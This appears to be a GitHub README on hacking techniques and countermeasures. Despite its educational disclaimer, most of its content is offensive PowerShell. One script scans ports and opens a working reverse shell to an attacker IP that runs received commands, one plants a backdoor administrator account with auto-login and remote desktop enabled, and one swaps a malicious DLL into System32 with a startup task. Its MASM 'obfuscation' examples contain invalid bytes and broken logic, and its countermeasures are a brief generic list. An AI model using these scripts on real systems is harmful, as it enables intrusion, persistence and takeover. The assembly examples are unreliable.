# Hacking-Techniques-and-Countermeasures
## DISCLAIMER

Please note that the information presented here is for educational purposes only. The techniques demonstrated in these scripts should never be used for malicious purposes. The author takes no responsibility for any damage or harm caused by the misuse of this information.

I do not recommend downloading these files either unless you have a good understanding of what they are doing to your machine.

Some files and executables have been removed for legal reasons.

I will **not** cover topics such as manifest editing AKA registry hacking because this could be used to severely disrupt a system
I will **not** discuss the many ways to automatically execute files from a usb drive

### TABLE OF CONTENTS
- [Hacking-Techniques-and-Countermeasures](#hacking-techniques-and-countermeasures)
  - [DISCLAIMER](#disclaimer)
    - [TABLE OF CONTENTS](#table-of-contents)
- [BACKGROUND](#background)
- [Cybersecurity Exercise: Advanced Obfuscation Techniques](#cybersecurity-exercise-advanced-obfuscation-techniques)
- [The Importance of Physical Security](#the-importance-of-physical-security)
- [KEEP YOUR NETWORKS SECURE](#keep-your-networks-secure)
  - [JUST HOW EASY IS IT TO HACK INTO A SERVER TERMINAL?](#just-how-easy-is-it-to-hack-into-a-server-terminal)
  - [WHAT CAN WE DO ONCE WE'RE "IN" ?](#what-can-we-do-once-were-in-)
    - [Example PowerShell script that creates a new administrator user, enables auto-login, and enables remote desktop registry:](#example-powershell-script-that-creates-a-new-administrator-user-enables-auto-login-and-enables-remote-desktop-registry)
    - [Here is an example of a PowerShell script that can be used to replace an existing .dll file on startup:](#here-is-an-example-of-a-powershell-script-that-can-be-used-to-replace-an-existing-dll-file-on-startup)
  - [Specific techniques that can be used to obfuscate code and bypass security measures.](#specific-techniques-that-can-be-used-to-obfuscate-code-and-bypass-security-measures)
  - [LOW-LEVEL EXECUTIONAL OBFUSCATION](#low-level-executional-obfuscation)
    - [INTRO](#intro)
    - [EXERCISE](#exercise)
    - [BASIC IMPLEMENTATION:](#basic-implementation)
    - [ADVANCED IMPLEMENTATION:](#advanced-implementation)
- [FINAL THOUGHTS](#final-thoughts)
  - [EVASION TECHNIQUES](#evasion-techniques)
  - [COUNTERMEASURES](#countermeasures)
- [SUM UP](#sum-up)
    - [ANSWERS](#answers)
  - [License Apache 2.0 License](#license-apache-20-license)

# BACKGROUND
Ever heard of the infamous Stuxnet cyberattack? In 2010, it was discovered that a highly sophisticated worm had infiltrated the Iranian nuclear program. Dubbed Stuxnet, this worm targeted industrial control systems and was able to spread through USB flash drives and other removable media. Even more impressive (or scary, depending on how you look at it), Stuxnet used advanced obfuscation techniques and zero-day exploits to evade detection and manipulate programmable logic controllers in the target systems.

Believed to be a joint effort between the United States and Israel, Stuxnet is one of the most complex cyberattacks ever discovered. It highlighted the potential for cyber warfare and the importance of advanced obfuscation techniques in infiltrating and compromising secure systems.

# Cybersecurity Exercise: Advanced Obfuscation Techniques
In this repository, we'll be diving into the critical role of cybersecurity in protecting digital assets and the techniques used by malicious actors to infiltrate and compromise secure networks. We'll cover a range of topics, including advanced obfuscation techniques and specific methods used to bypass security measures. Along the way, we'll emphasize the importance of physical security and provide practical tips for safeguarding against unauthorized access.

And don't worry, we won't leave you in the dark with complex theories and concepts. We've included a basic Microsoft Assembly (MASM) code example to illustrate the principle of obfuscation and a PowerShell script that enables you to create a new administrator user, auto-login, and modify the remote desktop registry. With these tools and techniques, you can better understand the importance of cybersecurity and learn effective ways to protect your digital assets.

# The Importance of Physical Security
Now, let's get real for a moment. You can have all the advanced digital techniques in the world, but if you're not implementing strong physical security measures, you're still at risk. Unsecured USB ports, unattended devices, and weak wireless network security can all provide easy entry points for attackers.

So, what can you do to prevent unauthorized access to your devices and networks? We'll provide practical tips and tricks to help you implement strong physical security measures and train your employees to recognize and avoid social engineering attacks.

# KEEP YOUR NETWORKS SECURE
## JUST HOW EASY IS IT TO HACK INTO A SERVER TERMINAL?

```PowerShell
# Set the attacker's IP address and port number
$attackerIP = "192.168.1.100"
$attackerPort = 4444

# Define an array of port numbers to check
$portsToCheck = @(
    21, # FTP
    22, # SSH
    23, # Telnet
    25, # SMTP
    80, # HTTP
    443 # HTTPS
)

# Loop through the array of port numbers
foreach ($port in $portsToCheck) {
    # Create a new TCP client object
    $client = New-Object System.Net.Sockets.TcpClient
    # Attempt to connect to the specified port on the attacker's machine
    $result = $client.BeginConnect($attackerIP, $port, $null, $null)
    # Wait for 500 milliseconds
    Start-Sleep -Milliseconds 500
    # Check if the connection was successful
    if ($client.Connected) {
        # Close the TCP client object
        $client.Close()
        # Print a message to the console indicating that the port is open
        Write-Host "Port $port is open!"
        # Create a new TCP client object to connect to the attacker's machine
        $client = New-Object System.Net.Sockets.TCPClient($attackerIP,$attackerPort)
        # Get the network stream object associated with the TCP client object
        $stream = $client.GetStream()
        # Create a byte array to store incoming data
        [byte[]]$bytes = 0..65535|%{0}
        # Read data from the network stream until there is no more data to read
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            # Convert the incoming data to a string
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            # Execute the incoming data as a PowerShell command and capture the output
            $sendback = (iex $data 2>&1 | Out-String )
            # Append a PowerShell prompt to the output
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
            # Convert the output to a byte array and write it to the network stream
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        # Close the TCP client object
        $client.Close()
    }
}
```
Note that this script checks for open ports on a specified list and if a port is open, it opens a reverse shell back to the attacker's machine. This is just an example and should not be used for malicious purposes.
## WHAT CAN WE DO ONCE WE'RE "IN" ?
### Example PowerShell script that creates a new administrator user, enables auto-login, and enables remote desktop registry:
```PowerShell
# Create new administrator user
$adminUsername = "NewAdminUser"
$adminPassword = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
$adminCredential = New-Object System.Management.Automation.PSCredential ($adminUsername, $adminPassword)
New-LocalUser -Name $adminUsername -Password $adminCredential -FullName "New Admin User" -Description "New administrator user account" -AccountNeverExpires -PasswordNeverExpires

# Add user to local administrators group
Add-LocalGroupMember -Group "Administrators" -Member $adminUsername

# Enable auto-login for new administrator user
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Set-ItemProperty -Path $regPath -Name "AutoAdminLogon" -Value "1"
Set-ItemProperty -Path $regPath -Name "DefaultUserName" -Value $adminUsername
Set-ItemProperty -Path $regPath -Name "DefaultPassword" -Value $adminPassword

# Enable remote desktop registry
$regPath = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
Set-ItemProperty -Path $regPath -Name "fDenyTSConnections" -Value "0"
Set-ItemProperty -Path $regPath -Name "AllowTSConnections" -Value "1"
```
### Here is an example of a PowerShell script that can be used to replace an existing .dll file on startup:
```PowerShell
# Replace DLL on startup
$sourceFile = "C:\Malicious\malware.dll"
$destinationFile = "C:\Windows\System32\evil.dll"
$backupFile = "C:\Windows\System32\backup.dll"

# Check if backup file exists
if(Test-Path $backupFile) {
    # Restore original file
    Move-Item $backupFile $destinationFile -Force
}

# Backup original file
Copy-Item $destinationFile $backupFile

# Replace file
Copy-Item $sourceFile $destinationFile -Force

# Add a scheduled task to run the malware on startup
$action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\evil.dll'
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MyMalware" -Description "Run malware on startup"
```
This script replaces the original evil.dll file in the C:\Windows\System32 directory with a malicious malware.dll file located in the C:\Malicious directory. It also creates a backup of the original file before replacing it.

Finally, the script adds a scheduled task to run the malware on startup, ensuring that it is executed each time the system is booted up. This is just one example of how PowerShell scripts can be used to execute malicious code and infiltrate a secure system.

## Specific techniques that can be used to obfuscate code and bypass security measures.

  One technique is to use encryption to hide the code from detection. For example, an attacker can use AES encryption to encrypt their malicious code and then decrypt it at runtime using a key or password. This makes it difficult for security software to detect the malicious code because it appears as encrypted data, which is commonly used for legitimate purposes.

Another technique is to use polymorphic code, which changes its structure or behavior at runtime to avoid detection. This can be achieved by using code obfuscation tools or by manually writing code that is difficult to analyze.

Code obfuscation tools can be used to modify the code in such a way that it is still functionally equivalent to the original code, but is much harder to read and analyze. These tools can rename variables and functions, add redundant code, and use various other techniques to make the code harder to understand.

Manual code obfuscation can be achieved by writing code that is hard to read and understand, even for experienced developers. This can be done by using complex control structures, writing code that is difficult to follow, and using unconventional programming techniques.

Overall, the key to obfuscation is to make the code as difficult as possible to analyze and understand, which makes it harder for security software to detect and prevent malicious activity.

## LOW-LEVEL EXECUTIONAL OBFUSCATION
### INTRO
Imagine you have a set of instructions that say:
```
Put on your shoes
Tie your shoes
Walk to the door
Open the door
Walk outside
```
Now, let's say we want to obfuscate these instructions. Instead of following them in order, we'll create a map that tells us the new order:
```
1 maps to 3
2 maps to 1
3 maps to 2
4 maps to 5
5 maps to 4
```
So now, the new set of instructions is:
```
Walk to the door
Put on your shoes
Tie your shoes
Walk outside
Open the door
```
Even though the instructions have been mixed up, the map tells us what order to follow them in. This makes it harder for someone to understand the end goal of the task just by looking at the instructions. This is the basic idea behind low-level executional obfuscation.

### EXERCISE
```
Ingredients:
- 2 cups all-purpose flour
- 1 tsp baking powder
- 1 tsp salt
- 1 cup unsalted butter, softened
- 1 cup white sugar
- 1 egg
- 1 tsp vanilla extract
- 2 cups chocolate chips

Obfuscated Recipe:
- Preheat golden 1 tsp
- Mix all-purpose butter and vanilla extract until fluffy
- Gradually mix white sugar
- Beat in chocolate chips
- Combine egg and salt in a bowl
- Mix well
- Fold in flour
- Drop onto ungreased baking sheet by spoonfuls
- Bake at 375°F for 12-15 minutes
- Remove from oven and let cool before serving

Can you guess what dish this is?
```
Did you guess it right?

The answer is revealed at the end!

Now let's get into some practical examples,

MASM (Microsoft Assembly) code that uses obfuscation techniques to confuse system execution:
### BASIC IMPLEMENTATION:
```Assembly
.code
    start:
        jmp short call_hook

        ; Insert code to be obfuscated here
        db "Hello, World!", 0

    call_hook:
        pop eax
        add eax, 0x05
        jmp eax
.end start
```
In this code, we are using a jmp instruction to jump to the call_hook label. The call_hook label then uses a pop instruction to retrieve the address of the jmp instruction and store it in the eax register. We then add the value 0x05 to eax and use another jmp instruction to jump to the new address stored in eax.

The effect of this is to "hide" the Hello, World! string by jumping over it using the jmp instruction. The address of the jmp instruction is then "scrambled" by adding 0x05 to it and jumping to the new, "scrambled" address.

This is a very simple example of obfuscation, but it demonstrates the basic principle of using jumps and other instructions to confuse the system's execution flow and make it harder to understand the code.

### ADVANCED IMPLEMENTATION:
```Assembly
; Obfuscated MASM code
.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.DATA
code db 0B4h, 4Ch, 4F7h, 045h, 9h, 02Bh, 02Fh, 5Bh, 56h, 51h, 89h, E5h

.CODE
start:
  ; Decrypt the code
  mov ecx, OFFSET code
  mov edx, OFFSET code
  mov al, [edx]
  xor al, [edx+1]
  xor al, [edx+2]
  xor al, [edx+3]
  xor al, [edx+4]
  xor al, [edx+5]
  xor al, [edx+6]
  xor al, [edx+7]
  xor al, [edx+8]
  xor al, [edx+9]
  xor al, [edx+10]
  mov [ecx], al

  ; Add a random jump
  jmp @F
  db 4Ch, 4F7h, 0E9h

  ; Insert code here to confuse analysis

  ; Jump back to the start of the code
  @@:
  jmp start

END start
```
Explanation:

- The .386 directive specifies that the code should be compiled for 80386 processors or later.
- The .model flat, stdcall directive specifies the memory model and calling convention to be used by the code.
- The option casemap:none directive disables case sensitivity for symbol names.
- The include directives include header files that define Windows API functions and constants.
- The includelib directives specify the libraries to link against.
- The .DATA section defines a byte array code that contains the encrypted obfuscated code.
- The .CODE section contains the code that will be executed.
- The start label marks the beginning of the code.
- The code decrypts the encrypted obfuscated code byte by byte using the xor instruction.
- A random jump is inserted using the jmp and db directives to add further confusion to the code.
- A section is left blank for additional obfuscation techniques to be inserted.
- The code jumps back to the start label to execute the decrypted obfuscated code again and again.

Note that this code is just an example and not meant to be used for malicious purposes. Obfuscation techniques should be used responsibly and ethically for legitimate purposes, such as improving the security of software and systems.

# FINAL THOUGHTS

## EVASION TECHNIQUES
Attackers are getting smarter and more sophisticated in their techniques to evade detection by security software. From anti-debugging techniques to rootkitting, they know how to stay hidden in your systems.

But don't panic just yet! Understanding these techniques is the first step to protecting yourself against them. Here are a few examples:

- Anti-debugging techniques: attackers can detect when their code is being debugged and take action to evade detection.
- Rootkitting: a type of malware that hides its presence on a system by modifying the operating system or other low-level components.
- Signature detection evasion: attackers use techniques like polymorphism to modify code so it appears unique and cannot be detected by signature-based detection methods.
- Dynamic linking and loading: loading malicious code into memory at runtime makes it difficult for security software to detect.
- Process injection: injecting malicious code into a legitimate process running on the system.

Scary stuff, right? But don't worry, there are ways to protect yourself.

## COUNTERMEASURES
Here are some practical countermeasures that can help protect you against these evasion techniques:

- Use up-to-date anti-malware software with behavioral analysis capabilities.
- Keep software and operating systems up-to-date with the latest security patches.
- Educate employees about common social engineering tactics and how to recognize and avoid them.
- Implement an IDPS to monitor network traffic and detect any suspicious activity that may indicate an attack.
- Segregate critical systems and data from the rest of the network.
- Implement a least privilege model for users.

By staying informed and implementing these countermeasures, you can reduce the risk of successful cyberattacks. Remember, it's a continuous process, so keep reviewing and updating your security measures to stay ahead of attackers.

# SUM UP
To sum up, this repository sheds light on the critical role of cybersecurity in protecting digital assets against malicious attacks. It covers a wide range of topics, including advanced obfuscation techniques, evasion techniques, and countermeasures that organizations can implement to safeguard their networks and prevent unauthorized access.

It's important to remember that cybersecurity should never be taken lightly, and these techniques should only be used for ethical purposes. By combining advanced obfuscation techniques with strong physical security, regular software updates, user education, intrusion detection, network segmentation, and the least privilege model, organizations can stay one step ahead of attackers and greatly reduce the risk of successful cyberattacks.

Overall, this repository is a valuable resource for anyone interested in cybersecurity, from students to professionals, and it provides practical tips and tools for protecting digital assets and ensuring the security of networks.

### ANSWERS
The instructions were how to bake cookies, but using low-level executional obfuscation to make it difficult to understand.
```
Directions:
1. Preheat oven to 375°F (190°C).
2. Combine flour, baking powder, and salt in a bowl. Mix well.
3. In another bowl, cream together butter and sugar until light and fluffy.
4. Beat in egg and vanilla extract.
5. Gradually mix in dry ingredients.
6. Fold in chocolate chips.
7. Drop dough by spoonfuls onto ungreased baking sheet.
8. Bake for 12-15 minutes or until golden brown.
9. Remove from oven and let cool before serving.
```
## License Apache 2.0 License
